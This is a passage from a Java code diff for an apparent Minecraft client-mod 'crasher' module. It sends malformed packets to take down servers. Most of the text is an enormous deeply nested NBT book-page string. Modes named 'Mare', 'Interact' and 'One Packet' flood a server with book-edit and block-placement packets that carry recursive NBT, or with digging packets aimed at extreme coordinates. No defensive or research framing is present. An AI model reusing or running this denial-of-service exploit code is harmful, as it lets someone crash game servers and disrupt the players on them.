a:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
+                    }
+
+                    comp.setString("author", RandomStringUtils.random(16, "0123456789"));
+                    comp.setString("title", RandomStringUtils.random(16, "0123456789"));
+                    comp.setByte("resolved", (byte) 1);
+                    comp.setTag("pages", list);
+                    final ItemStack stack = new ItemStack(Items.written_book);
+                    stack.setTagCompound(comp);
+                    final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+                    buffer.writeItemStackToBuffer(stack);
+                    PacketUtil.sendPacket(new C17PacketCustomPayload("MC|BEdit", buffer));
+                }
+                break;
+            }
+
+            case "Mare": {
+                for (int i = 0; i &lt; packets.getValue(); i++) {
+                    final NBTTagCompound tag = new NBTTagCompound();
+                    final NBTTagList list = new NBTTagList();
+                    final StringBuilder value = new StringBuilder().append("{");
+                    final int amount = 833;
+
+                    int i2;
+                    for (i2 = 0; i2 &lt; amount; i2++) {
+                        value.append("extra:[{");
+                    }
+
+                    for (i2 = 0; i2 &lt; amount; i2++) {
+                        value.append("text:\u2F9F}],");
+                    }
+
+                    value.append("text:\u2F9F}");
+                    list.appendTag(new NBTTagString(value.toString()));
+                    tag.setTag("pages", list);
+                    final ItemStack book = new ItemStack(Items.writable_book);
+                    book.setTagCompound(tag);
+                    PacketUtil.sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), 2, book, 0.0F, 0.0F, 0.0F));
+                }
+                break;
+            }
+
+            case "Interact": {
+                for (int i = 0; i &lt; packets.getValue(); i++) {
+                    PacketUtil.sendPacket(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.ABORT_DESTROY_BLOCK, new BlockPos(RandomUtils.nextDouble(0, Double.MAX_VALUE), RandomUtils.nextDouble(0, Double.MAX_VALUE), RandomUtils.nextDouble(0, Double.MAX_VALUE)), EnumFacing.UP));
+                }
+                break;
+            }
+
+            case "One Packet": {
+                final NBTTagCompound tag = new NBTTagCompound();
+                final NBTTagList list = new NBTTagList();
+
+                for (int i = 0; i &lt; 2; i++) {
+                    list.appendTag(new NBTTagString("{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{extra:[{text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],t